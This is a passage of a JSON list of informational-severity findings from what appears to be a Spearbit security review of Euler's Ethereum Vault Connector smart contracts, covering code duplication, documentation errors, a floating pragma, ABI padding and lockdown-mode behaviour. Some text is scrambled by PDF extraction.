["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Optimization on onlyOwner and setOperator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The onlyOwner modifier and the setOperator function uses the same logic to authenticate a call:  Calculate the phantomAccount address phantomAccount = address(uint160(uint152(addressPrefix)) << ACCOUNT_ID_OFFSET);  Then authenticate the call authenticateCaller({account: phantomAccount, allowOperator: false, checkLockdownMode: false}); The setOperator does not use the modifier because it needs to use the msgSender returned by the authenti- cateCaller but both use the same 2 operations to authenticate a call which results in duplicated code.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consider using ACCOUNT_ID_OFFSET instead of 8", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The ACCOUNT_ID_OFFSET is a constant used to determine the account prefix or phantom accounts. This constant is used in various places instead of the number 8 but it's missing in the getAddressPrefixInternal. function getAddressPrefixInternal(address account) internal pure returns (bytes19) { return bytes19(uint152(uint160(account) >> 8)); }", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Consider improving the comments in the setLockdownMode and setPermitDisabledMode, aligning them with the natspec documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "In both the setLockdownMode and setPermitDisabledMode, the mode cannot be turned off (revert) when checks are deferred and when msg.sender == adress(this). Those two requirements mean that you cannot turn off the mode when the functions are executed via a EVC.call, EVC.batch or EVC.permit. The inline comment: \"to disable this mode a direct call to the EVC must be made\" could be improved in clarity by being more explicit, like how it's documented inside the relative Natspec documen- tation written for the very same functions inside the IEthereumVaultConnector interface.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "All the contracts, libraries and interfaces are declared with a floating pragma", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "All the contracts, libraries and interfaces are declared with a floating pragma: pragma solidity (cid:2)0.8.19;. The floating pragma issue is mitigated by the fact that the Solidity version, which will be used at build time, is locked at 0.8.24 inside foundry.toml. Nevertheless, it's both a good dev and security practice to specify the locked pragma that should be used directly in the contracts, libraries and interfaces.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Natspec: the operator natspec for setOperator and setAccountOperator is outdated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "In both the functions Natspec documentation, it's stated that the operator cannot be equal to ad- dress(0). This check is not implemented in the actual code, and the Euler team has indeed confirmed that the documentation is outdated.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Natspec: improve and clarify the natspec documentation about the enabled parameter for the set- PermitDisabledMode function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The setPermitDisabledMode allows the owner of an addressPrefix to disable the permit func- tionality. When enabled=TRUE the permit function will be disabled (user is enabling the disable-mode), when enabled=FALSE the permit function will be enabled (user is disabling the disable-mode). The current Natspec for the enabled parameter states: /// @param enabled A boolean indicating whether to enable or disable permit functionality. By just reading such documentation, an external actor could assume that passing enabled=true would enable the permit function, while in reality, it's totally the opposite.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "callThroughEVC ABI encoding does not right-pad data parameter with zeroes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The callThroughEVC modifier encodes the following call using custom code: function call(address targetContract, address onBehalfOfAccount, uint256 value, bytes calldata data) external returns (bytes memory result); According to the ABI argument encoding, it should right-pad the bytes data parameter with zeroes until it's a multiple of 32. followed by the minimum number of zero-bytes such that len(enc(X)) is a multiple of 32. 7 However, the custom assembly code does not do this, in contrast to what abi.encodeCall(EVC.call, (ad- dress(this), msg.sender, 0x0, data)) would do.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Lockdown mode is checked before authenticating caller", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The authenticateCaller({ account, checkLockdownMode: true }) function checks the lock- down mode of the provided account even before checking if the caller is allowed to operate on behalf of account. The code will revert with EVC_LockdownMode if the account is in lockdown mode, instead of EVC_NotAuthorized if the caller is not authorized.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "batchSimulation's result array's length increased", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "sult(batchItemsResult, accountsStatusCheckResult, vaultsStatusCheckResult);. copied to the result array and the inner arrays are being decoded via: The batchSimulation function calls batchRevert that returns EVC_RevertedBatchRe- This return data is (batchItemsResult, accountsStatusCheckResult, vaultsStatusCheckResult) = abi.decode(result, (BatchItemResult[], StatusCheckResult[], StatusCheckResult[])); For this to work, the 4-byte selector needs to be skipped. The code does this by simply pointing the result array pointer 4 bytes ahead: assembly { result := add(result, 4) } However, this changes the result array's length as it now includes the selector in addition to its initial length. The array length will be > 2**32. Theabi.decode function currently still works as it only checks that, while decoding, the read memory offsets are not out of the array bounds (using the wrong result length). As batchRevert always correctly encodes its return data and the new result length is always greater than the original result length, this check does not cause issues.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Docs: Lockdown mode specification violations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The Lockdown mode specification currently reads: the EVC MUST significantly reduce its functionality across the Once Lockdown Mode activated, Owner's Accounts. In this mode, the Owner is restricted to managing Operators and Nonces, while authorized Operators are restricted to revoking their own permissions. With Lockdown Mode active, neither the Owner nor the Operators can carry any other operations on the EVC. Notably, calling external smart contracts on behalf of the Owner or any of their Accounts is prohibited. However, enabled Controllers can still control collaterals for the Accounts, even under lockdown. summarize, To eral/forgiveAccountStatusCheck/disableController as be callable. setOperator, setNonce, only setAccountOperator it's the controller (and triggering these) controlCollat- should However, it's currently possible to use call/batch functions to call back to msg.sender as it skips the authenti- cateCaller(checkLockdown=true) checks. This technically violates \"Notably, calling external smart contracts on behalf of the Owner or any of their Accounts is prohibited\". The owner can also call setLockdownMode to turn it off and setPermitDisabledMode.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Docs: Improve reentrancy specification", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The reentrancy specification currently reads: Only the Checks-Deferrable Call functions and Permit function MUST be allowed to re-enter the EVC.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}]